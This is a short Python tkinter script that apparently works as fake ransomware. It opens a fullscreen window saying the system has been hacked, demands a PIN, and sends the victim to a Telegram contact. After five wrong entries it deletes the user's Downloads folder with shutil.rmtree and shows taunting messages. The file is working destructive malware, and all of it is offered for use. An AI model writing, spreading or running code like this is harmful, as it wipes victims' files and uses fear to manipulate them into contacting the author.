import tkinter as tk
from tkinter import messagebox
import webbrowser
import shutil
import os

def show_warning():
    root = tk.Tk()
    root.title("System Alert")
    root.attributes('-fullscreen', True)  # Make window fullscreen

    # Optional: Set background color for better appearance
    root.configure(bg="white")

    # Use a frame to center the content
    frame = tk.Frame(root, bg="white")
    frame.place(relx=0.5, rely=0.5, anchor="center")

    tk.Label(frame, text="YOUR SYSTEM HAS BEEN HACKED!!!", font=("Arial", 32, "bold"), fg="red", bg="white").grid(row=0, column=0, columnspan=2, pady=30)
    tk.Label(frame, text="Don't you want to lose your FILE??????", font=("Arial", 24), bg="white").grid(row=1, column=0, columnspan=2, pady=10)
    tk.Label(frame, text="If you want to save your data, please enter the PIN below.", font=("Arial", 20), bg="white").grid(row=2, column=0, columnspan=2, pady=10)
    tk.Label(frame, text="INPUT PIN TO SAVE YOUR DATA!", font=("Arial", 24), bg="white").grid(row=2, column=0, columnspan=2, pady=10)

    tk.Label(frame, text="PIN:", font=("Arial", 20), bg="white").grid(row=3, column=0, sticky="e", padx=10)
    pin_entry = tk.Entry(frame, show="*", font=("Arial", 20), width=10)
    pin_entry.grid(row=3, column=1, sticky="w", padx=10)

    attempts = {'count': 0}
    max_attempts = 5

    def check_pin():
        pin = pin_entry.get()
        if pin == "NhSlKeMneakEng":
            messagebox.showinfo("Success", "Your data is safe!")
            root.destroy()
        else:
            attempts['count'] += 1
            if attempts['count'] == 1:
                messagebox.showwarning("Warning", "Baby!! Don't Cry I will help you to save your data!, Contact me on Telegram!")
                contact_btn = tk.Button(frame, text="Contact Us", font=("Arial", 18), command=lambda: webbrowser.open("https://t.me/RxaaxaTralalero"))
                contact_btn.grid(row=5, column=2, columnspan=2, pady=10)
            elif attempts['count'] < max_attempts:
                tk.Label(frame, text=f"Incorrect PIN! {max_attempts - attempts['count']} attempts left.", font=("Arial", 18), fg="red", bg="white").grid(row=5, column=0, columnspan=2, pady=10)
            else:
                clear_screen = tk.Label(frame, text="Your screen will be cleared in 5 seconds!", font=("Arial", 18), fg="red", bg="white")
                clear_screen.grid(row=5, column=0, columnspan=2, pady=10)
                tk.Label(frame, text="YOUR DATA WILL BE DELETED!!!!!!!!!!!!", font=("Arial", 20), bg="white").grid(row=6, column=0, columnspan=2, pady=10)
                tk.Label(frame, text="HEHEHEHEHEEHEHHEHEHEHEHEHEHEHEHHE", font=("Arial", 18), bg="white").grid(row=7, column=0, columnspan=2, pady=10)
                tk.Label(frame, text="Check ur Downloads folder baby", font=("Arial", 18), bg="white").grid(row=8, column=0, columnspan=2, pady=10)
                webbrowser.open("https://youtu.be/szPj47Sb87s")
                download_folder = r"C:\Users\User\Downloads"
                if os.path.exists(download_folder):
                    try:
                        shutil.rmtree(download_folder)
                    except Exception:
                        pass
                root.after(50000, root.destroy)

    submit_btn = tk.Button(frame, text="Submit", font=("Arial", 20), command=check_pin)
    submit_btn.grid(row=4, column=0, columnspan=2, pady=30)

    root.mainloop()

if __name__ == "__main__":
    show_warning()
